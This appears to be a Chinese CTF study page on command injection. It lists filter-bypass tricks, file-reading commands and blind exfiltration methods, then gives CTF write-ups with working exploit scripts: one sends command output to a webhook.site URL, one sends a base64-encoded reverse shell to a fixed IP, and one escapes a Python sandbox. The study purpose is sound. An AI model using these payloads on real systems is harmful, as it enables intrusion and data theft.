# 🖥️ 命令注入

## 基础知识

### Bash/Shell 的语法

> 常用命令，输入/输出重定向，管道，环境变量

### Powershell/CMD 的语法

> 常用命令

## WAF Bypass（Vqs147）

编码/混淆 空格/换行的替代 通配符的妙用 特殊环境变量

**编码/混淆：**

    base64编码：`` `echo "Y2F0IDEudHh0Cg"|base64 -d` ``

    进制编码：`$(printf "\x6c\x73")`    `` `echo -e "\x6c\x73"` ``    `echo 6c73 | xxd -r -p | bash`

**过滤空格：**原始命令cat /etc/passwd

    `{cat,/etc/passwd}` （bash可以，只对未被引起来的字符串有效，sh不行）

    `cat</etc/passwd`

    `cat$IFS/etc/passwd`   如果是相对路径的话得加大括号：`cat${IFS}1.txt` 或者 `cat$IFS$91.txt`

    用tab等其它空白字符替代空格

**过滤关键字**（例如cat）：

    用其它命令替代，例如tac

    c''at    c""at    c\\at    c$9at

    绝对路径+regex：`/bin/ca[t]`    `/bin/ca?`

    字符串拼接：`a=ca;b=t;$a$b flag`

    编码绕过：`` `echo "Y2F0IDEudHh0Cg"|base64 -d` ``

**过滤换行**：用|  &  ;或\`\` $()执行多条命令

**通配符**：可以用在绝对路径的程序名或参数中，例如`/bin/c?t /et?/pass??`

    某些命令用通配符执行时会导致命令参数注入，例如`tar czf /tmp/backup.tar.gz *`

    执行时先将通配符展开再执行命令，可以命令执行：

```bash
echo "..." > root.sh：# 创建一个名为 root.sh 的恶意脚本
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > "--checkpoint=1"
```

特殊环境变量：

    $SHELL：执行shell的程序

    ${PATH:0:1}：字符串变量切片

    $$：当前Shell的进程ID (PID)

    $IFS：Shell分隔符

    $9：空变量

## 无回显的信息外带方案（Vqs147）

网络外带（DNS/ICMP/HTTP） 盲注

    能出网的话直接反弹shell就行了

    不出网：

    1、把信息写到能访问的文件里，例如index.html

    2、时间盲注

    3、布尔盲注

## 读取文件的技巧（lq）

可用的命令 通过文件描述符读 windows中如何读

### 常用命令

linux:

```bash
cat tac
nl 为输出加上编号
sort 将输出排序
uniq 删除重复行输出
rev 逆序输出
od 以八进制、十进制、十六进制、浮点格式或 ASCII 编码字符输出
file -f /path/to/file
date -f /path/to/file 通过报错读取
xxd 十六进制输出
curl file:///path/to/file 通过file协议读取
more 
less
head -n N /path/to/file
tail -n N /path/to/file
grep 'pattern' /path/to/file
awk '{print}' /path/to/file
sed -n '1,100p' /path/to/file
dd if=/path/to/file bs=1 count=XXX skip=YYY
strings
paste
diff file1 file2
```

Windows

```powershell
type C:\path\to\file
more < C:\path\to\file
powershell -Command "Get-Content C:\path\to\file"
certutil -encodehex -f target_file output_file
copy target_file output_file
```

### 通过文件描述符读取


1. `exec 3< /path/to/file;while read -u 3 line;do echo $line;done` 

   将目标文件关联到一个未被使用的文件描述符，然后通过这个文件描述符读取文件。
2. `/proc/self/fd/N` 

   `/proc/self/fd/` 目录包含了当前进程打开的所有文件描述符的链接，当目标文件的后缀名被过滤或者不知道目标文件名，可以通过遍历这个目录读取文件。
3. `/dev/fd/N` 

   与`/proc/self/fd/N`相同。

## 环境变量注入


## 特定语言的命令注入

> 有什么危险函数？常见的调用方式？可以在哪些参数注入？有哪些函数会间接引入命令注入？

### PHP

### Python

### Java

### 其他语言

Go/NodeJS


## 参考链接

* [https://0x80dotblog.wordpress.com/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/#:\~:text=you can also take advantage,called via %24u like so](https://0x80dotblog.wordpress.com/2021/07/28/os-command-injection-tutorial-part-1-basics-and-filter-evasion/#:\~:text=you%20can%20also%20take%20advantage,called%20via%20%24u%20like%20so)


## 例题

### （lq）DownUnderCTF 2024 Prisoner Processor

`/examples` 提供 prisoner 详细信息，`/convert-to-yaml` 可以将 prisoner 信息写入 yaml 文件。

```typescript
app.post('/convert-to-yaml',
    ...
      const body = c.req.valid('json');
      const data = body.data;
      const signedData = getSignedData(data)
      const signature = body.signature;
      if (!hasValidSignature(signedData, signature)) {
        return c.json({ msg: "signatures do no match!" }, 400);
      }
      const outputPrefix = z.string().parse(signedData.outputPrefix ?? "prisoner");
      const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
    ...
```

提交的数据中没有 `outputPrefix`的值,所以默认是prisoner。如果可以控制`outputPrefix`就可以控制写入的文件名。 这里考虑原型污染，通过添加 `signed.__proto__` 更改`outputPrefix`，且由于 `__proto__` 属性不可枚举，因此不会用于计算签名。 为了能写入yaml以外类型的文件，还需要使用NULL截断之后的文件名。

```typescript
const BANNED_STRINGS = ["app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"];
```

能够写入任意类型文件后可以考虑写入`index.ts`，黑名单中限制了app, src, index等目录或文件名，所以可以利用 `/proc/self/fd/3` 写入 `index.ts`。 最后只需要写入一个不存在的目录即可让bun崩溃然后重启。 exp:

```python
import requests
body = requests.get("http://100.95.136.43:1337/examples").json()["examples"][0]
signature = body["signature"]

body["data"]["signed.__proto__"] = {"outputPrefix":"../../proc/self/fd/3\00"}
payload = {
    "data": {
        "const a": "string = new TextDecoder().decode(Bun.spawnSync([\"/bin/bash\", \"-c\", \"/bin/getflag\"]).stdout);fetch(\"https://webhook.site/2cca7093-c8b0-4659-a39f-d6a6282a35ae/?=\"+a)/*",
        **body["data"],
        "nothing": "nothing */"
    },
    "signature": signature
}
r = requests.post("http://ip:port/convert-to-yaml",json=payload)
body["data"]["signed.__proto__"] = {"outputPrefix":"../../proc/notexist"}
r = requests.post("http://ip:port/convert-to-yaml",json=body)
```


\

\
### （Vqs147）Midnight Sun CTF 2025 **UselessCorp**

1、发现漏洞点

题目只提供了一个后端接口，是发送name,email,subject,message传给php的mail()函数，搜索互联网发现php的mail()函数一般会把发送者作为-f参数拼接进执行的命令中，也就是我们可控的email参数可以注入sendmail命令的参数。

2、漏洞利用

接下来要知道sendmail有哪些参数可以利用。首先查到 `-OQueueDirectory=/tmp/  -X/var/www/shell.php`可以写入任意文件，通过subject等字段可以控制文件的内容，尝试写webshell、crontab，没用。考虑到这道题所有人共用一个题目环境，可能运行sendmail命令的用户没用任何写权限。

所以需要找到sendmail的能够直接执行命令的参数。最终发现-be参数直接就可以执行命令，语法需要参考官方文档。直接反弹shell：

```none
email=aaa( -be ${run,preexpand{${base64d:L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTI0LjcwLjEzMi4yMDkvNjY2NyAwPiYxIgo==}}} )@xxx.com
```


### （Vqs147）阿里云CTF 2025 ezoj

python沙箱逃逸：

```python
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)
```

可以在这段代码后面插入任何代码，然后运行python脚本，audithook用白名单方式限制事件执行。

根据白名单，可以用import导入模块，但导入外部模块需要用到compile和exec会触发audithook，因此只能导入内部模块。内部模块_posixsubprocess的函数fork_exec可以命令执行，代码模板：

```python
import os
import _posixsubprocess
cmd = b''
_posixsubprocess.fork_exec([b"/bin/sh",  b"-c" , cmd], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

题目环境不出网。此时第一种做法是把完整的执行的命令放在cmd参数中，时间盲注得到flag。

第二种做法是，注意到回显包含错误码：

```python
except OJRuntimeError as e:
    return {"status": "RE", "message": f"Runtime Error: ret={e.args[0]}"}
```

先用sys.version_info获取python版本，然后通过错误码一位位带出flag。现在需要想办法获取_posixsubprocess.fork_exec执行命令后的结果。这个函数创建一个子进程执行命令，输出是子进程的stdout。但是fork_exec的一个参数c2pwrite用于重定向子进程的输出，先用std_pipe = os.pipe()创建在当前进程创建一个管道，然后把c2pwrite设置成std_pipe\[1\]，就可以通过std_pipe\[0\]读取到执行命令的结果。

解题脚本：

```python
import requests

url = "http://121.41.238.106:20570/"

payload = """
import os
import _posixsubprocess
import sys

cmd = b'cat /flag*'
std_pipe = os.pipe()
_posixsubprocess.fork_exec([b"/bin/sh",  b"-c" , cmd], [b"/bin/sh"], True, (), None, None, -1, -1, -1, std_pipe[1], -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
flag = os.read(std_pipe[0], 1024)
sys.exit(flag[{i}])
"""

result = ''
for i in range(0, 100):
    data = {
        "code": payload.format(i=i),
        "problem_id": 0,
    }
    r = requests.post(url=url+"api/submit", json=data)
    resp_data = r.json()
    assert resp_data["status"] == "RE"
    result += chr(int(resp_data["message"][19:]))
    print(result)
```


### （Teru）CISCN 2025 总决赛 Day1 hardphp